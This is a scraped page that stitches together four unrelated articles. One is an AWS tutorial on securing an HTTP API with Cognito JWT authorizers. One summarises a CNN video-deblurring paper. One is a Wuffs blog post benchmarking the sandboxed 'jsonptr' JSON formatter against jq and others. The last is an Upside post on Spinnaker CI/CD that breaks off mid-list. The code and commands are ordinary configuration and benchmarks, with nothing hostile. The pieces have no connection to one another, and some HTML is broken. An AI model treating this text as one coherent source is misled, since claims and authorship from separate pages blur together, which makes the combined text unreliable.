      <p>Last year AWS released a new iteration of their API Gateway product: <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/http-api.html">HTTP APIs</a>. This new version promises lower prices, improved performance and some new features. Some features that are available in the older REST API are not (yet) available for HTTP APIs, though. The official <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/http-api-vs-rest.html">comparison page</a> gives a good overview of which features are available in both products.</p>
<p>My favorite new feature available for HTTPs APIs is <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/http-api-jwt-authorizer.html">JWT Authorizers</a>. It is now possible to have the HTTP API validate a JWT coming from an OIDC or OAuth 2.0 provider. While this was already possible using a Lambda Authorizer, now this can be achieved in a fully managed way with only a minimum amount of work required. It's even easier now to build secure APIs with proper authentication.</p>
<p>In this blog post, I'll create an <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-identity-pools.html">Amazon Cognito User Pool</a> with a test user and authenticate to an HTTP API using a JWT issued by Cognito. You can find the fully working code in my <a href="https://github.com/SanderKnape/cognito-apigateway-jwt">GitHub repository</a>. Below I'll go through the code and explain it step by step.</p>
<h2 id="creating-the-cognito-user-pool">Creating the Cognito User Pool</h2>
<p>The following CloudFormation creates a User Pool and a User Pool Client:</p>
<div><pre><code data-lang="yaml">UserPool:
  Type: AWS::Cognito::UserPool
  Properties:
    AutoVerifiedAttributes:
      - email
    UsernameAttributes:
      - email
    UserPoolName: cognito-apigateway

UserPoolClient:
  Type: AWS::Cognito::UserPoolClient
  Properties:
    ClientName: cognito-apigateway
    ExplicitAuthFlows:
      - ALLOW_USER_PASSWORD_AUTH
      - ALLOW_REFRESH_TOKEN_AUTH
    UserPoolId: !Ref UserPool
</code></pre></div><p>This code provisions a User Pool that accepts the user's e-mail address as the username. In addition, the <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-client-apps.html">User Pool App Client</a> is required as we need an entity that is allowed to make API calls to our user pool (such as signing in).</p>
<h2 id="creating-the-http-api">Creating the HTTP API</h2>
<p>The following CloudFormation sets up the HTTP API with the JWT Authorizer:</p>
<div><pre><code data-lang="yaml">HttpApi:
  Type: AWS::ApiGatewayV2::Api
  Properties:
    Name: cognito-apigateway
    ProtocolType: HTTP

HttpApiAuthorizer:
  Type: AWS::ApiGatewayV2::Authorizer
  Properties:
    ApiId: !Ref HttpApi
    AuthorizerType: JWT
    IdentitySource:
      - <span>"$request.header.Authorization"</span>
    JwtConfiguration:
      Audience:
        - !Ref UserPoolClient
      Issuer: !Sub <span>"https://cognito-idp.${AWS::Region}.amazonaws.com/${UserPool}"</span>
    Name: JwtAuthorizer

HttpApiIntegration:
  Type: AWS::ApiGatewayV2::Integration
  Properties:
    ApiId: !Ref HttpApi
    IntegrationMethod: GET
    IntegrationType: HTTP_PROXY
    IntegrationUri: https://www.wikipedia.org/
    PayloadFormatVersion: <span>1.0</span>

HttpApiRoute:
  Type: AWS::ApiGatewayV2::Route
  Properties:
    ApiId: !Ref HttpApi
    AuthorizationType: JWT
    AuthorizerId: !Ref HttpApiAuthorizer
    RouteKey: GET /
    Target: !Sub <span>"integrations/${HttpApiIntegration}"</span>

HttpApiStage:
  Type: AWS::ApiGatewayV2::Stage
  Properties:
    ApiId: !Ref HttpApi
    AutoDeploy: <span>true</span>
    StageName: $default
</code></pre></div><p>This code sets up an HTTP API with a single GET route that forwards all requests to the Wikipedia homepage. The route is configured to use the JWT Authorizer. This authorizer expects the token to be present under the <code>Authorization</code> header, optionally prefixed with <code>Bearer</code> to conform to the formal specification. You can however use any header you want and omit the <code>Bearer</code> prefix altogether.</p>
<p>We also configure the authorizer to require the ID of the User Pool Client to match either the audience (<code>aud</code>) or the <code>client_id</code> entry in the token. We then set the required issuer to the URL of the User Pool; we can now be sure we only accept tokens issued by our User Pool.</p>
<h2 id="authenticating-with-the-http-api">Authenticating with the HTTP API</h2>
<p>To test the authentication, we first need to gather some details from the resources we just created.</p>
<ul>
<li>The ID of the User Pool. You can find this at the top of the homepage of your User Pool.</li>
<li>The ID of the User Pool Client. When in the Cognito User Pool UI, click “App clients” on the left. The ID we're looking for is the <code>App client id</code>.</li>
<li>The URL of the HTTP API. You can find this on the homepage of your API under “Invoke URL”.</li>
</ul>
<p>We'll test the JWT authentication using some bash scripts. Let's first set the above values as variables in addition to fake credentials for our test user:</p>
<div><pre><code data-lang="bash">EMAIL<span>=</span>fake@example.com
PASSWORD<span>=</span>S3cure!!

CLIENT_ID<span>=</span>&lt;client_id&gt;
POOL_ID<span>=</span>&lt;pool_id&gt;
API_URL<span>=</span>&lt;api_url&gt;
</code></pre></div><p>Next, we first properly add a user to the user pool. This is just required for this demo to test the functionality.</p>
<div><pre><code data-lang="bash">aws cognito-idp sign-up <span>\
</span><span></span>  --client-id <span>${</span>CLIENT_ID<span>}</span> <span>\
</span><span></span>  --username <span>${</span>EMAIL<span>}</span> <span>\
</span><span></span>  --password <span>${</span>PASSWORD<span>}</span>

aws cognito-idp admin-confirm-sign-up <span>\
</span><span></span>  --user-pool-id <span>${</span>POOL_ID<span>}</span> <span>\
</span><span></span>  --username <span>${</span>EMAIL<span>}</span>
</code></pre></div><p>We now authenticate with this user and store the returned JWT:</p>
<div><pre><code data-lang="bash">TOKEN<span>=</span><span>$(</span>aws cognito-idp initiate-auth <span>\
</span><span></span>    --client-id <span>${</span>CLIENT_ID<span>}</span> <span>\
</span><span></span>    --auth-flow USER_PASSWORD_AUTH <span>\
</span><span></span>    --auth-parameters USERNAME<span>=</span><span>${</span>EMAIL<span>}</span>,PASSWORD<span>=</span><span>${</span>PASSWORD<span>}</span> <span>\
</span><span></span>    --query <span>'AuthenticationResult.AccessToken'</span> <span>\
</span><span></span>    --output text<span>)</span>
</code></pre></div><p>Finally, we perform a <code>curl</code> request on our API using the token we just retrieved:</p>
<div><pre><code data-lang="bash">curl -s -D - -o /dev/null -H <span>"</span><span>Authorization: Bearer </span><span>${</span>TOKEN<span>}</span><span>"</span> <span>${</span>API_URL<span>}</span>
</code></pre></div><p>This command only displays the returned headers, not the body. The header should show a 200 status code, meaning that we properly authenticated with the API. If you run this script without the token - or open the URL in your browser - you will get a 401 Unauthorized response instead. As expected! The API is only accessible with a valid, non-expired JWT from an authenticated user.</p>
<h2 id="conclusion">Conclusion</h2>
<p>In this post I went through the steps required to authenticate to an HTTP API with a JWT issued by AWS Cognito. Keep in mind that you can use this method with any OIDC identity provider that issues JWTs. Considering the simplicity in setting this up and the fact that no maintenance is required to keep it up and running, this is certainly an approach to consider when building authenticated APIs.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
        We present a simple and effective deep convolutional neural network (CNN) model for video deblurring. The proposed algorithm mainly consists of optical flow estimation from intermediate latent frames and latent frame restoration steps. It first develops a deep CNN model to estimate optical flow from intermediate latent frames and then restores the latent frames based on the estimated optical flow. To better explore the temporal information from videos, we develop a temporal sharpness prior to constrain the deep CNN model to help the latent frame restoration. We develop an effective cascaded training approach and jointly train the proposed CNN model in an end-to-end manner. We show that exploring the domain knowledge of video deblurring is able to make the deep CNN model more compact and efficient. Extensive experimental results show that the proposed algorithm performs favorably against state-of-the-art methods on the benchmark datasets as well as real-world videos.
      </p><p>
        The proposed algorithm contains the optical flow estimation module, latent image restoration module, and the temporal sharpness prior. For the optical flow estimation, we use the PWC-Net [5] to estimate optical flow. For the latent image restoration module, we use an encoder-decoder architecture based on [26]. However, we do not use the ConvLSTM module. Other network architectures are the same as [26].
      </p><p>
        To effectively train the proposed algorithm, we develop a cascaded training approach and jointly train the proposed model in an end-to-end manner. At each stage, it takes three adjacent frames estimated from the previous stage as the input and generates the deblurred results of the central frame. When handling every three adjacent frames, the proposed network shares the same network parameters.
        The variables \( \tilde{I}_{i+1}(x) \) and \( \tilde{I}_{i-1}(x) \) denote the warped results of \( I_{i+1}(x+u_{i+1\rightarrow i}) \) and \( I_{i-1}(x+u_{i-1\rightarrow i}) \), respectively.
      </p><p>
        As demonstrated in [4], the blur in the video is irregular, and thus there exist some pixels that are not blurred. Following the conventional method [4], we explore these sharpness pixels to help video deblurring. The sharpness prior is defined as:
        \[ S_i(x) = exp(-\frac{1}{2} \sum_{j\&amp;j\neq0}D(I_{i+j}(x+u_{i+j \rightarrow i}); I_i(x))) \tag{10} \]
        where \( D(I_{i+j}(x+u_{i+j \rightarrow i}); I_i(x)) \) is defined as \( \left \| I_{i+j}(x+u_{i+j \rightarrow i} - I_i(x) \right \|^2 \).
      </p><p>
        Based on (10), if the value of \( S_i(x) \) is close to 1, the pixel \(x\) is likely to be clear. Thus, we can use \( S_i(x) \) to help the deep neural network to distinguish whether the pixel is clear or not so that it can help the latent frame restoration. To increase the robustness of \( S_i(x) \), we define \( D(.) \) as:
        \[ D(I_{i+j}(x+u_{i+j \rightarrow i}); I_i(x)) = \sum_{y\in \omega(x)} \left \| I_{i+j}(x+u_{i+j \rightarrow i} - I_i(x) \right \|^2 \tag{11} \]
        where \( \omega(x) \) denotes an image patch centerd at pixel \( x \).
      </p><p>
        We further train the proposed method to convergence, and get higher PSNR/SSIM than the result reported in the paper.
      </p><p>
        Quantitative results on the benchmark dataset by Su et al. [24]. All the restored frames instead of randomly selected 30 frames from each test set [24] are used for evaluations. <em>Note that: Ours* is the result that we further trained to convergence, and Ours is the result reported in the paper.</em>
      </p><p>
        Quantitative results on the GOPRO dataset by Nah et al.[20].
      </p><p>
        Here are some visual comparisons with state-of-the-art methods. The proposed algorithm generates much clearer frames.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      
      

      

<p><em>Summary: <code>jsonptr</code> is a new, sandboxed command-line tool that formats JSON and
speaks the JSON Pointer query syntax. Wuffs standard library’s JSON decoder can
run in O(1) memory, even with arbitrarily long input (containing arbitrarily
long strings) because it uses multiple tokens to represent each JSON string.
Processing the JSON Pointer query during (instead of after) parsing can
dramatically impact performance. <code>jsonptr</code> can be faster, use less memory and
be safer than alternatives such as <code>jq</code>, <code>serde_json</code> and <code>simdjson</code>.</em></p>

<h2 id="jsonptr"><code>jsonptr</code></h2>

<p><a href="https://github.com/google/wuffs/blob/a325d7860f9c922b805d959a7f66c726adc92593/example/jsonptr/jsonptr.cc"><code>jsonptr</code></a> is
a command-line formatter for <a href="https://www.json.org/">JSON</a>, a ubiquitous,
human-readable file format. It also implements the <a href="https://www.ietf.org/rfc/rfc6901.txt">JSON
Pointer</a> syntax for identifying a
sub-node of the JSON input. For example, Chromium’s Preferences files are
compact (minified, with no extra whitespace or line breaks) but <code>jsonptr</code> can
make them more readable.</p>

<div><div><pre><code>$ git clone https://github.com/google/wuffs.git
$ g++ -O3 -Wall wuffs/example/jsonptr/jsonptr.cc -o my-jsonptr
$ ./my-jsonptr -query=/browser/window_placement \
&gt; ~/.config/google-chrome/Profile\ 1/Preferences
{
    "bottom": 1200,
    "docked": false,
    "left": 0,
    "maximized": false,
    "right": 1920,
    "top": 0,
    "work_area_bottom": 1200,
    "work_area_left": 0,
    "work_area_right": 1920,
    "work_area_top": 0
}
</code></pre></div></div>

<p>By itself, that’s not particularly novel. Many existing JSON processing tools
do this. Picking <code>jq</code> as a popular example, its syntax isn’t JSON Pointer
syntax, but <code>jq .browser.window_placement ~/.config/google-chrome/Profile\
1/Preferences</code> will print something similar, and <code>jq</code> comes with <a href="https://stedolan.github.io/jq/manual/">many more
useful features</a>.</p>

<p>Looking closer, there are several advantages to <code>jsonptr</code>. <strong>The first is
speed</strong>. Here are some numbers from throwing an <code>x86_64</code> Broadwell desktop CPU
at some JSON files from the
<a href="https://github.com/miloyip/nativejson-benchmark"><code>miloyip/nativejson-benchmark</code></a>
and <a href="https://github.com/zemirco/sf-city-lots-json"><code>zemirco/sf-city-lots-json</code></a>
repositories. The <code>time</code> output (and later, the <code>/usr/bin/time</code> output), a
median of three runs, has been edited for brevity and embellished with a N.NNx
ratio (N.NN greater than 1 means that <code>jsonptr</code> is better).</p>

<div><div><pre><code>$ time ./my-jsonptr &lt; canada.json       &gt; /dev/null
real    0m0.013s  (1.00x by definition)
$ time ./my-jsonptr &lt; citm_catalog.json &gt; /dev/null
real    0m0.006s  (1.00x by definition)
$ time ./my-jsonptr &lt; citylots.json     &gt; /dev/null
real    0m1.119s  (1.00x by definition)
$ time ./my-jsonptr &lt; twitter.json      &gt; /dev/null
real    0m0.004s  (1.00x by definition)

$ time jq .         &lt; canada.json       &gt; /dev/null
real    0m0.238s  (18.3x vs jsonptr)
$ time jq .         &lt; citm_catalog.json &gt; /dev/null
real    0m0.095s  (15.8x vs jsonptr)
$ time jq .         &lt; citylots.json     &gt; /dev/null
real    0m15.533s (13.9x vs jsonptr)
$ time jq .         &lt; twitter.json      &gt; /dev/null
real    0m0.062s  (15.5x vs jsonptr)
</code></pre></div></div>

<p>Both <code>jsonptr</code> and <code>jq</code> can emit compact output, reducing the running time.</p>

<div><div><pre><code>$ time ./my-jsonptr -compact-output &lt; citylots.json &gt; /dev/null
real    0m0.863s   (1.00x by definition)

$ time jq --compact-output .        &lt; citylots.json &gt; /dev/null
real    0m12.140s  (14.1x vs jsonptr -compact-output)
</code></pre></div></div>

<p><strong>The second is memory usage</strong>.</p>

<div><div><pre><code>$ /usr/bin/time -v ./my-jsonptr &lt; canada.json &gt; /dev/null
Maximum resident set size (kbytes): 1096   (1.00x by definition)

$ /usr/bin/time -v jq .         &lt; canada.json &gt; /dev/null
Maximum resident set size (kbytes): 18900  (17.2x vs jsonptr)
</code></pre></div></div>

<p><strong>The third is safety</strong>. <code>jq</code> is written in C, a memory-unsafe language. The
<a href="https://github.com/google/wuffs/blob/a325d7860f9c922b805d959a7f66c726adc92593/example/jsonptr/jsonptr.cc"><code>jsonptr.cc</code></a>
file is written in C++, also memory-unsafe, but the core JSON decoder is
written in <a href="https://github.com/google/wuffs">Wuffs</a>, a
<a href="https://github.com/google/wuffs/blob/a325d7860f9c922b805d959a7f66c726adc92593/doc/note/memory-safety.md">memory-safe</a>
language designed for crafting
<a href="https://github.com/google/wuffs/blob/a325d7860f9c922b805d959a7f66c726adc92593/doc/note/hermeticity.md">hermetic</a>
libraries.</p>

<h3 id="sandboxing">Sandboxing</h3>

<p>For additional defence in depth, on Linux, the second thing that <code>jsonptr</code>’s
<code>main</code> function does is to
<a href="https://github.com/google/wuffs/blob/a325d7860f9c922b805d959a7f66c726adc92593/example/jsonptr/jsonptr.cc#L1434">self-impose</a>
a <a href="https://man7.org/linux/man-pages/man2/seccomp.2.html"><code>SECCOMP_MODE_STRICT</code></a>
sandbox. The first thing that it does is to open (but not read) the file named
in the command line arguments, which the sandbox would otherwise prohibit.</p>

<p>A <code>SECCOMP_MODE_STRICT</code> sandbox effectively restricts the program to only read
from the input file, compute on its bytes and write to <code>stdout</code>. Even if</p>

<ol>
  <li>malicious input tickled</li>
  <li>a bug in Wuffs’ JSON library that combined with</li>
  <li>a bug in the Wuffs compiler’s proofs of safety</li>
</ol>

<p>decoding such input still couldn’t access the file system or the network, run
other programs, etc.</p>

<p>One implication of the <code>SECCOMP_MODE_STRICT</code> sandbox is that <strong>the program
cannot dynamically allocate memory</strong>, and indeed, Wuffs’ JSON library runs with
zero dynamic allocations. It never calls <code>malloc</code> or invokes <code>new</code>. That’s not
“zero dynamic allocations in the steady state”, that’s “zero dynamic
allocations, full stop”.</p>

<p>The program statically allocates <a href="https://github.com/google/wuffs/blob/a325d7860f9c922b805d959a7f66c726adc92593/example/jsonptr/jsonptr.cc#L438-L447">three 32 KiB
buffers</a>
for the JSON decoder to use, but <code>jsonptr</code> can still handle megabytes of input,
or even individual megabyte-long JSON strings. How it does this is discussed
further below, starting with the “Wuffs Buffers” section.</p>

<p>Being sandboxed means that it’s less worrisome to process untrusted files from
the network, even when downloading over HTTP (not HTTPS).</p>

<div><div><pre><code>$ # prize.json has no line breaks.
$ wget -q -O - http://api.nobelprize.org/v1/prize.json | wc
      0   14703  216670
$ # jsonptr can make it more human-readable.
$ wget -q -O - http://api.nobelprize.org/v1/prize.json | \
&gt; ./my-jsonptr | head -n 20
{
    "prizes": [
        {
            "year": "2019",
            "category": "chemistry",
            "laureates": [
                {
                    "id": "976",
                    "firstname": "John",
                    "surname": "Goodenough",
                    "motivation": "\"for the development of lithium-ion batteries\"",
                    "share": "3"
                },
                {
                    "id": "977",
                    "firstname": "M. Stanley",
                    "surname": "Whittingham",
                    "motivation": "\"for the development of lithium-ion batteries\"",
                    "share": "3"
                },
</code></pre></div></div>

<p>For an additional party trick, <code>jsonptr</code> can print a depth-limited summary of
the JSON node tree.</p>

<div><div><pre><code>$ wget -q -O - http://api.nobelprize.org/v1/prize.json | \
&gt; ./my-jsonptr -query=/prizes/0 -max-output-depth=2
{
    "year": "2019",
    "category": "chemistry",
    "laureates": [
        "{…}",
        "{…}",
        "{…}"
    ]
}
</code></pre></div></div>

<h2 id="trade-offs">Trade-Offs</h2>

<p>To be clear, <code>jq</code> (or any other software discussed below) isn’t bad software.
It’s great software, deserving its many happy users. There’s simply trade-offs
where <code>jsonptr</code> and <code>jq</code> make different but equally reasonable choices.</p>

<h3 id="sorting-keys">Sorting Keys</h3>

<p>Unlike <code>jsonptr</code>, <code>jq</code> is able to sort object keys.</p>

<div><div><pre><code>$ echo '{"three":3,"four":4}' | ./my-jsonptr
{
    "three": 3,
    "four": 4
}
$ echo '{"three":3,"four":4}' | jq .
{
  "three": 3,
  "four": 4
}
$ echo '{"three":3,"four":4}' | jq --sort-keys .
{
  "four": 4,
  "three": 3
}
</code></pre></div></div>

<p>Sorting keys is certainly a useful feature, and while the <a href="https://www.ietf.org/rfc/rfc8259.txt">JSON specification
(RFC 8259)</a> does not rule out duplicate
keys, many applications assume (often implicitly) that keys are unique, and
sorting keys helps efficiently detect duplicates.</p>

<p>However, if the top-level JSON value is an object (a dictionary of key-value
pairs) then a formatter cannot print anything other than the opening <code>{</code>
character until the entire value is parsed. <strong>This requires <code>O(N)</code> memory,
where <code>N</code> is the length of the input</strong>. In comparison, the <code>jsonptr</code> program
does not sort keys and requires only <code>O(1)</code> memory. Again, neither better or
worse per se, just making different trade-offs.</p>

<h3 id="parsing-numbers">Parsing Numbers</h3>

<p>Unlike <code>jsonptr</code>, <code>jq</code> will convert JSON numbers from strings (<code>"123"</code> being
one two three) to numbers (<code>123</code> being one hundred and twenty three), using
IEEE 754 <code>double</code> precision.</p>

<div><div><pre><code>$ echo 0.99999999999999999 | ./my-jsonptr
0.99999999999999999
$ echo 0.99999999999999999 | jq .
1
</code></pre></div></div>

<p>This is certainly useful when comparing values to other numbers. <code>jq</code>’s query
language allows filters like <code>map(select(. &gt;= 2))</code>. It’s also more convenient,
for a programming API instead of a command-line tool, to work with JSON numbers
as a <code>double</code> instead of a <code>std::string</code>. Nonetheless, having the parser
(instead of the caller) always convert from <code>std::string</code> to <code>double</code> can be
surprisingly expensive. <strong>Optimizing <code>StringToDouble</code> (or its equivalent) can
dramatically <a href="https://github.com/google/double-conversion/issues/137">speed up a JSON
parser</a></strong>. For a
formatter, skipping a redundant <code>StringToDouble</code> and <code>DoubleToString</code> round
trip entirely means a faster program.</p>

<h2 id="rust">Rust</h2>

<p>Wuffs is most often compared with <a href="https://www.rust-lang.org/">Rust</a>. Both are
memory-safe (but not garbage collected) languages with C/C++ interoperability.</p>

<p>One difference is that Wuffs’ standard library is transpiled to C, not compiled
to object code, so that existing C/C++ projects can <strong>use Wuffs’ standard
library like any other third party C library</strong> (it’s just not hand-written C),
without needing to pull in another language toolchain. The “<code>git clone</code> and
then <code>g++</code>” instructions at the top of this article do not involve “install the
Wuffs compiler”.</p>

<p>Again, neither better or worse per se, just making different trade-offs.
There’s also the <a href="https://github.com/thepowersgang/mrustc"><code>mrustc</code></a>
alternative Rust compiler, a work-in-progress.</p>

<h3 id="jsonxf"><code>jsonxf</code></h3>

<p><code>jsonxf</code> is a JSON pretty-printer written in Rust (without any use of
<code>unsafe</code>). The <code>-m</code> flag minifies output.</p>

<div><div><pre><code>$ cargo install jsonxf
$ time ~/.cargo/bin/jsonxf    &lt; citylots.json &gt; /dev/null
real    0m1.928s  (1.72x vs jsonptr)
$ time ~/.cargo/bin/jsonxf -m &lt; citylots.json &gt; /dev/null
real    0m1.871s  (2.17x vs jsonptr)
</code></pre></div></div>

<p>It does not validate JSON escape sequences. This is <a href="https://github.com/gamache/jsonxf/blob/cd2835dc33f6c03999baa4ae4a9ff1dbd860134e/src/jsonxf.rs#L12-L15">a deliberate design
decision</a>,
not a bug, but it is a point of difference from <code>jsonptr</code>.</p>

<div><div><pre><code>$ echo -n '"Backslash-t (\t) is   valid JSON."' | ./my-jsonptr; echo $?
"Backslash-t (\t) is   valid JSON."
0
$ echo -n '"Backslash-a (\a) is invalid JSON."' | ./my-jsonptr; echo $?
"Backslash-a (
json: bad backslash-escape
1
$ echo -n '"No final double-quote'              | ./my-jsonptr; echo $?
"No final double-quote
json: bad input
1

$ echo -n '"Backslash-t (\t) is   valid JSON."' | ~/.cargo/bin/jsonxf; echo $?
"Backslash-t (\t) is   valid JSON."0
$ echo -n '"Backslash-a (\a) is invalid …</code></pre></div></div></div></div>

<p id="c8d2" data-selectable-paragraph="">At&nbsp;<a href="https://upside.com/" target="_blank" rel="noopener noreferrer">Upside</a>, we take pride in our deployment culture. We ship new versions of code multiple times per day through our various environments powered by AWS and Kubernetes. We run an infrastructure stack that leverages the powerful&nbsp;<a href="https://www.redhat.com/en/topics/microservices/what-are-microservices" target="_blank" rel="noopener noreferrer">microservice architecture pattern</a>&nbsp;that sees our applications broken up into smaller segments that each do one thing, but do it very well. Thanks to our applications being loosely coupled, we feel safe deploying fast and deploying often due to blast radius being minimized.</p>
<p id="2da5" data-selectable-paragraph="">Half the battle of implementing true CI/CD is already won at Upside due to our awesome engineering management and teams being fully supportive of the culture. The other half of the battle is implementing it from a technical standpoint. A big portion of this effort involves weighing the pros and cons of the many tools out there in regards to your specific CI/CD needs. This is very important; just because there is a shiny new item out there, doesn’t necessarily mean that it is a one size fits all for everyone. To quote the late American psychologist Abraham Maslow, “If all you have is a hammer, everything looks like a nail”.</p>

<p id="e50c" data-selectable-paragraph="">Let’s take a step back to fully flesh out what CI/CD means, because it can help us start to visualize the problem that we believe Spinnaker helps us to solve.</p>
<p id="9258" data-selectable-paragraph="">CI/CD stands for “Continuous Integration and Continuous Delivery/Deployment”:</p>
<h2 id="79eb" data-selectable-paragraph="">Continuous Integration</h2>
<p id="a26e" data-selectable-paragraph="">Continuous Integration deals with the culture of integrating code into a shared repository multiple times per day. Often times, automated tests are run on every merge, and artifact builds are kicked off. In our case at Upside, upon every merge to master, we run tests and then build and push a new Docker image that represents that version of the code.</p>
<h2 id="225b" data-selectable-paragraph="">Continuous Delivery/Deployment</h2>
<p id="4231" data-selectable-paragraph="">These are actually two different cultures and the difference between the two can really elevate a team’s ability to roll new services out. Continuous Delivery deals with automating the process of deploying artifacts into your environments. Typically this involves an automated deployment into dev, in which some sort of a manual judgement is needed to then deploy that artifact to later environments, and then finally ending in a deployment to production. Continuous Deployment takes this a step further and removes these manual judgements. This can be a heavy undertaking due to engineers having to write and rely on automated testing which will dictate if the code should be promoted to the next environment or not. Another roadblock to Continuous Deployment is finding the right tooling that balances out-of-the-box functionality but still leaving enough room for customization. At Upside, we are making the push to get to full Continuous Deployment, and Spinnaker is what is enabling us to get there.</p>

<p id="c0b7" data-selectable-paragraph="">Now that we can start to see what the true nature of Continuous Deployment looks like, let’s talk about the open-sourced tool developed by Netflix called Spinnaker that helps to enable it.</p>
<blockquote>
<p id="a137" data-selectable-paragraph="">Also, a disclaimer that this article is less of a “how to use Spinnaker”, and more of a high level “how we are leveraging Spinnaker at Upside”. If you are interested in how to get started, check out the Spinnaker docs on&nbsp;<a href="https://spinnaker.io/setup/install/" target="_blank" rel="noopener noreferrer">how to install it</a>&nbsp;and&nbsp;<a href="https://spinnaker.io/guides/user/get-started/" target="_blank" rel="noopener noreferrer">create your first pipeline</a>.</p>
</blockquote>
<h2 id="bccd" data-selectable-paragraph="">Okay, I understand the problem — but what exactly is Spinnaker?</h2>
<p id="d0f6" data-selectable-paragraph="">In a nutshell, Spinnaker is an open-sourced and self-hosted platform that allows you to quickly build out deployment pipelines. It is also multi-cloud in that you can easily deploy with built in functions to AWS, Azure, GCP, and Kubernetes to name a few. For example, need a stage in your pipeline to deploy a Helm chart to a Kubernetes cluster? Easy, there’s a built in function for this. Oh, but it needs to be a Canary deployment and analysis? Done, Spinnaker comes with that built in functionality as well. At Upside, these built in functionalities are a big reason of what sold us on Spinnaker — could you imagine scripting these in Jenkins?</p>
<h2 id="5117" data-selectable-paragraph="">A few Spinnaker terms</h2>
<ul>
<li id="46a1" data-selectable-paragraph=""><strong>Application</strong>&nbsp;— an application can have 0 to many&nbsp;<em>pipelines</em>. In our case, each one of our microservices is its own application in Spinnaker.</li>
<li id="0bd5" data-selectable-paragraph=""><strong>Pipeline</strong>&nbsp;— a pipeline has 0 to many&nbsp;<em>stages</em>. At Upside, each of our Spinnaker applications has a pipeline that deploys to our dev environment, another that deploys to our staging environment, and finally one for our prod environment.</li>
<li id="69d2" data-selectable-paragraph=""><strong>Stage</strong>&nbsp;— represents an action in a pipeline. For example, a stage to deploy a Helm chart, another stage to publish this deployment information to our centralized logging solution, and a stage that may require a manual approval to continue the pipeline, to name a few.</li>
<li id="4823" data-selectable-paragraph=""><strong>Pipeline-template</strong>&nbsp;— this is a parameterized JSON file that represents a pipeline. This is where we can define a pipeline and its stages in code. The purpose of this is for reuse. For example, at Upside, we deploy most of our 200+ microservices in the same fashion, therefore we want a single source of truth when we define our pipelines. So when the time comes to add an application to Spinnaker, we just create its dev, stage, and prod pipelines and point each to its respective pipeline-template. Another benefit of this is if, for example, a new stage needs to be added to all of our applications’ dev pipelines, we just edit the dev pipeline-template, and the change propagates to all of our applications.</li>
</ul>

</div><figcaption data-selectable-paragraph=""></figcaption></figure>
<p id="f252" data-selectable-paragraph="">Above is a somewhat simple deployment pipeline that we use here at Upside, but still nonetheless complex. I won’t get into the specifics of what each stage is doing, but the pipeline is triggered either manually in the Spinnaker UI, or triggered on a new image hitting a Docker registry. The pipeline then uses Helm to bundle our Kubernetes spec files into an artifact that can be used downstream by our Deploy stage.</p>
<p id="aa94" data-selectable-paragraph="">Then we have a manual approval stage that is dynamically enabled if our Run Tests stage sees something in our newly deployed resources that would need human intervention for. This manual approval has 3 options:</p>
<ol>
<li id="b9c9" data-selectable-paragraph=""><strong>Stop</strong>&nbsp;— this stops the pipeline and the next environment’s pipeline will not execute.</li>
<li id="fed0" data-selectable-paragraph=""><strong>Stop and Rollback&nbsp;</strong>— this option is selected via the dropdown in the image below and will stop the deployment from going to the next environment, as well as also rolling back the current environment’s deployment to the previous image version.</li>
<li id="d09e" data-selectable-paragraph=""><strong>Continue</strong>&nbsp;— this continues the deployment to the next environment.</li>

<h2 id="0e20" data-selectable-paragraph="">Why this deployment flow is an improvement</h2>
<p id="36cc" data-selectable-paragraph="">Previously at Upside, we had continuous deployment to our Dev environment in that upon merge to master, Jenkins would use Helm to deploy to Dev. It was then up to the engineering teams to trigger this Jenkins job to promote that to our Staging environment, and then finally to Prod. Spinnaker helps improve upon this in the following ways:</p>
<ul>
<li id="93e7" data-selectable-paragraph="">More complexity and robustness in our pipelines flows. We began to hit a ceiling with Jenkins in that scripting any further complexity was going to become very tedious. Spinnaker enables us to quickly roll out more robust pipeline workflows.</li>
<li id="df3b" data-selectable-paragraph="">A single pane of glass. The Spinnaker UI allows diving into various bits of the infrastructure that each pipeline deploys such as pod logs, ReplicaSet information, the ability to scale up and down pods, etc. Also, engineers are able to make manual judgements to continue/stop/rollback within the Spinnaker UI.</li>
<li id="543b" data-selectable-paragraph="">Engineers dictate their own Continuous Deployment fate. At Upside, we allow our engineering teams the freedom to write their own tests that dictate whether or not to have full automation to Prod with no manual approvals needed (aka Continuous Deployment). If their self-defined tests pass, then the deployment will automatically continue to the next environment. Spinnaker helps to enable this due to the ease of dictating pipeline branching with conditionals.</li>
<li id="d8c2" data-selectable-paragraph="">Much more robust built in functionality for&nbsp;<a href="https://spinnaker.io/guides/user/kubernetes-v2/rollout-strategies/" target="_blank" rel="noopener noreferrer">deployment strategies</a>&nbsp;such as Dark, Red/Black, Highlander, and Canary. Again, for emphasis — could you imagine scripting all of this in Jenkins? For us, this is what sold us on Spinnaker.</li>
</ul>

<h2 id="50a4" data-selectable-paragraph="">The Good</h2>
<ul>
<li id="d8fa" data-selectable-paragraph=""><em>Lots of built in functionality</em>&nbsp;— this leads to being able to quickly create more robust and complex pipelines.</li>
<li id="0d8b" data-selectable-paragraph=""><em>Reusability —&nbsp;</em>with our microservice architecture where most services are usually deployed in the same fashion, pipeline-templates allow us to propagate the same pipeline workflow amongst all of our Spinnaker applications.</li>
<li id="0e34" data-selectable-paragraph=""><em>Visibility</em>&nbsp;— the Spinnaker UI offers a lot of information about a pipeline execution as well as its deployed Kubernetes infrastructure.</li>
<li id="08b5" data-selectable-paragraph=""><em>Pipeline workflow</em>&nbsp;— Spinnaker makes it a breeze to have stages in a pipeline rely on other stages, run in parallel, or be enabled/disabled upon certain conditionals, to name a few.</li>
<li id="8a31" data-selectable-paragraph=""><em>Lots of provider plugins</em>&nbsp;— While we are only taking advantage of the Kubernetes provider, Spinnaker has a&nbsp;<a href="https://spinnaker.io/setup/install/providers/" target="_blank" rel="noopener noreferrer">plethora of other provider plugins</a>&nbsp;to run deployments to a multitude of platforms (AWS, GCP, Azure, Oracle, etc.)</li>
</ul>
<h2 id="ddfb" data-selectable-paragraph="">The Bad</h2>
<ul>
